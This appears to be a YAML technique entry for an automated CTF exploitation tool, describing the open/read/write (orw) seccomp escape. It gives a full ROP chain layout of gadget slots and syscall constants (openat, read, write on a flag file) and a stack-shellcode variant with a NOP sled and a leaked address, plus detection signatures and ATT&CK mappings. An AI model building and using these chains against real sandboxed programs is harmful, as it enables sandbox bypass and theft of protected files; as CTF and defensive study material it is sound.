technique: orw
author: Gregory Epp
source: https://ctf-wiki.org/pwn/linux/user-mode/sandbox/seccomp/c-sandbox-escape/

rules:
  # sibling rules share the head: the OR the DSL expresses by
  # splitting (the provenance carries every firing - engine B3).
  # nx false: the stub rides the executable stack (the lab's case);
  # nx true: the ROP path needs a syscall gadget in the binary.
  - id: app_orw_stack
    head: [applicable, orw]
    conditions:
      - [fact, seccomp, true]
      - [fact, nx, false]
  - id: app_orw_rop
    head: [applicable, orw]
    conditions:
      - [fact, seccomp, true]
      - [fact, nx, true]
      - [fact, has_syscall_gadget, true]

kb:
  - id: orw_001
    technique: orw
    description: >
      seccomp blocks execve: the open/read/write chain reads the flag
      without ever spawning a shell. The chain needs the syscall gadget
      the profiler already hunts, and every gadget the facts carry.
    chain: [open_flag, read_fd, write_stdout]
    unlocks: [flag_read]
    success_rate: 0.45

mcts:
  requires: []
  provides: [flag_read]
  terminal: true
  success: 0.45

priors: [6, 14]

build:
  technique: orw
  variants:
    # the ROP path (nx on): the openat/read/write chain aims the
    # binary's own .data anchors (flag_path, out_buf) through the
    # pop/syscall gadget set the profiler already carries. AT_FDCWD
    # (-100) rides as its unsigned qword; the filter's openat-only
    # discipline is the chain's first syscall. fd 3: the lowest free
    # descriptor once stdin/out/err are taken.
    - name: rop
      layout:
        - [padding, measured_offset]
        - [chain,
           "gadget:pop_rax_ret", "const:257",
           "gadget:pop_rdi_ret", "const:18446744073709551516",
           "gadget:pop_rsi_ret", "sym:flag_path",
           "gadget:pop_rdx_ret", "const:0",
           "gadget:syscall_ret",
           "gadget:pop_rax_ret", "const:0",
           "gadget:pop_rdi_ret", "const:3",
           "gadget:pop_rsi_ret", "sym:out_buf",
           "gadget:pop_rdx_ret", "const:256",
           "gadget:syscall_ret",
           "gadget:pop_rax_ret", "const:1",
           "gadget:pop_rdi_ret", "const:1",
           "gadget:pop_rsi_ret", "sym:out_buf",
           "gadget:pop_rdx_ret", "const:256",
           "gadget:syscall_ret"]
    # the stack path (nx off): the orw stub rides the executable
    # stack, the input buffer's address rides the harvest leak
    - name: stack
      layout:
        - [padding, measured_offset, sled]
        - [qword, leak:input]
        - [shellcode, orw, flag.txt]


# The defender side (the corpus read backwards): what this technique
# looks like to the defenses. Armored by check 9.
detection:
  - channel: syscall
    signature: "open+read+write syscall sequence without execve, on a filtered process"
    note: "THE orw chain: execve blocked, orw the only path"
  - channel: crash
    signature: "SIGSYS (bad system call) following an execve attempt"
    note: "the filter doing its job - the operator probed execve"

# The ATT&CK mapping (the navigator export consumes it)
mitre:
  - T1083
  - T1056
